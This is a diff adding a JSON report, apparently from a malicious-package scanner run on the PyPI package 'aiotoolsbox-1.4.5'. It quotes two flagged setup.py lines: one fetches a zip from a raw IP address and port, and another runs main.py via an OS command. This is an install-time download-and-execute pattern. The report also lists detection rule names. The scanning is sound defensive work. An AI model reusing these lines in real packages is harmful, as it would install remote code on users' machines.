@@ -1,0 +1,30 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "exec-base64": {},
+        "steganography": {},
+        "obfuscation": {},
+        "clipboard-access": {},
+        "silent-process-execution": {},
+        "code-execution": [
+            {
+                "location": "setup.py:79",
+                "code": "    system(f'cd \"{temp_dir}\" & \"{inter}\" main.py')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "download-executable": {},
+        "exfiltrate-sensitive-data": {},
+        "shady-links": [
+            {
+                "location": "setup.py:67",
+                "code": "    content = Request(f'http://77.91.77.31:6382/versions/{version_info[0]}{version_info[1]}.zip')\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "cmd-overwrite": {},
+        "dll-hijacking": {}
+    },
+    "path": "./dataset/pypi/aiotoolsbox-1.4.5"
+}
